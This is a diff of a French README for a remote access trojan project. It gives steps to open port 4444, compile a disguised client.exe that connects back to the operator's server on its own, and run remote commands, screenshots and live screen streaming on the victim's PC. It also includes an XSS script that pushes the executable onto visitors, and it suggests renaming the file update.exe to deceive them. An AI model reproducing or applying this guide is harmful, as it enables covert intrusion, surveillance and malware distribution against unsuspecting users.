@@ -49,13 +49,13 @@ Suivez ces étapes pour configurer le projet :
 
 Cloner le projet (ou téléchargez les fichiers) :
 ```bash
-git clone 
-cd rat-control-panel
+git clone https://github.com/Toragp28/ratatouille-beta.git
 ```
 
 Installer les dépendances :Exécutez la commande suivante pour installer toutes les bibliothèques nécessaires :
+```bash
 pip install Pillow opencv-python cryptography pyinstaller
-
+```
 
 💡 tkinter est inclus avec Python. Si vous rencontrez des erreurs, vérifiez votre installation Python.
 
@@ -68,8 +68,10 @@ Obtenez une image .png pour l'icône (par exemple, téléchargez depuis IconArch
 
 Configurer le réseau :
 
-Ouvrez le port 4444 sur le serveur :netsh advfirewall firewall add rule name="RAT" dir=in action=allow protocol=TCP localport=4444
-
+Ouvrez le port 4444 sur le serveur :
+```bash
+netsh advfirewall firewall add rule name="RAT" dir=in action=allow protocol=TCP localport=4444
+```
 
 Si vous utilisez une IP publique, configurez le port forwarding sur votre routeur.
 
@@ -79,8 +81,9 @@ Si vous utilisez une IP publique, configurez le port forwarding sur votre routeu
 🚀 Utilisation
 1. Lancer l'interface graphique
 Exécutez l'interface pour configurer et contrôler le RAT :
+```bash
 python ui.py
-
+```
 L'interface affiche :
 
 Un champ pour entrer l'adresse IP du serveur.
@@ -92,9 +95,11 @@ Une zone de logs pour suivre les actions.
 2. Démarrer le serveur
 
 Cliquez sur "Démarrer le serveur" dans l'interface.
-Les logs affichent :Serveur démarré sur 0.0.0.0:4444
+Les logs affichent :
+```bash
+Serveur démarré sur 0.0.0.0:4444
 Adresses IP locales : 192.168.1.100, ...
-
+```
 
 Notez l'IP affichée (par exemple, 192.168.1.100) pour l'étape suivante.
 
@@ -107,8 +112,10 @@ Si vous utilisez une IP publique, assurez-vous que le port 4444 est accessible.
 
 Cliquez sur "Importer une icône (.png)".
 Sélectionnez un fichier .png (idéalement 32x32 ou 64x64 pixels).
-L'interface convertit automatiquement le .png en .ico et affiche :Icône importée et convertie : edge.png -> temp_icon.ico
-
+L'interface convertit automatiquement le .png en .ico et affiche :
+```bash
+Icône importée et convertie : edge.png -> temp_icon.ico
+```
 
 
 
@@ -123,22 +130,28 @@ Compile client.py en dist/client.exe avec PyInstaller, en utilisant l'icône imp
 Supprime le fichier .ico temporaire.
 
 
-Les logs confirment :client.py modifié avec SERVER_HOST = 192.168.1.100
+Les logs confirment :
+```bash
+client.py modifié avec SERVER_HOST = 192.168.1.100
 Compilation réussie. Exécutable généré dans dist/client.exe
-
+```
 
 
 6. Tester le client
 
 Copiez dist/client.exe sur un PC client (Windows avec interface graphique).
-Exécutez :client.exe
-
+Exécutez :
+```bash
+client.exe
+```
 
 L'exécutable affiche l'icône personnalisée et se connecte automatiquement au serveur.
-Sur le serveur, entrez des commandes dans la console (ouverte automatiquement) :whoami
+Sur le serveur, entrez des commandes dans la console (ouverte automatiquement) :
+```bash
+whoami
 screenshot
 stream
-
+```
 
 screenshot : Enregistre received_screenshot.jpg.
 stream : Affiche l'écran du client en temps réel (appuyez sur q pour arrêter).
@@ -148,13 +161,15 @@ stream : Affiche l'écran du client en temps réel (appuyez sur q pour arrêter)
 7. Déploiement via XSS (optionnel)
 Pour distribuer client.exe via une vulnérabilité XSS (dans un cadre éthique) :
 
-Hébergez client.exe :python -m http.server 8080
-
-
+Hébergez client.exe :
+```bash
+python -m http.server 8080
+```
+```bash
 Injectez via XSS :<script>
     window.location = 'http://votre-serveur:8080/client.exe';
 </script>
-
+```
 
 L'icône personnalisée rend l'exécutable plus convaincant (par exemple, renommez-le update.exe).
 
@@ -163,13 +178,14 @@ L'icône personnalisée rend l'exécutable plus convaincant (par exemple, renomm
 
 
 📋 Exemple de logs dans l'UI
+```bash
 Thu May 15 17:00:00 2025: Démarrage du serveur...
 Thu May 15 17:00:01 2025: Serveur démarré sur 0.0.0.0:4444
 Thu May 15 17:00:05 2025: Connexion de 192.168.1.98:54321
 Thu May 15 17:00:10 2025: Icône importée et convertie : edge.png -> temp_icon.ico
 Thu May 15 17:00:15 2025: client.py modifié avec SERVER_HOST = 192.168.1.100
 Thu May 15 17:00:20 2025: Compilation réussie. Exécutable généré dans dist/client.exe
-
+```
 
 🐞 Dépannage
 
@@ -225,5 +241,5 @@ Cryptography
 PyInstaller
 
 
-📧 Pour toute question ou suggestion, ouvrez une issue sur le dépôt GitHub !
+📧 se programe était super amusent et laide de l'ia a était agréable bisous 
 
